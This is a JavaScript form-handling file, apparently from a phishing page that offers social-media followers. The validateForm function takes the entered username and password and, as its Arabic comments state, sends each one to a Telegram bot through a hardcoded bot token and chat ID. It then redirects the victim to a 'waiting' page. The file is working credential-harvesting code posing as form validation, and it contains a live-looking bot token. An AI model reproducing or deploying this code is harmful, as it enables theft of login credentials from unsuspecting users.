function validateForm() {

    let username = document.getElementById("username").value;

    let password = document.getElementById("password").value;

    let followers = document.getElementById("followers").value;

    let errorMessage = document.getElementById("error-message");

    if (username === "" || password === "") {

        errorMessage.textContent = "يرجى ملء جميع الحقول!";

    } else {

        errorMessage.textContent = "";

        // إرسال البريد إلى البوت

        sendToBot("تم إرسال البريد: " + username);

        

        // إرسال كلمة المرور إلى البوت

        sendToBot("الباسورد: " + password);

        // توجيه المستخدم إلى صفحة الانتظار بعد الضغط على زر الشحن

        window.location.href = "waiting.html"; 

    }

}

// دالة إرسال البيانات إلى بوت التليجرام

function sendToBot(message) {

    const botToken = "7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E";

    const chatId = "5375214810";

    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    

    fetch(url)

        .then(response => response.json())

        .then(data => {

            if (data.ok) {

                console.log("Message sent successfully");

            } else {

                console.log("Failed to send message");

            }

        })

        .catch(error => console.error('Error sending message to bot:', error));

}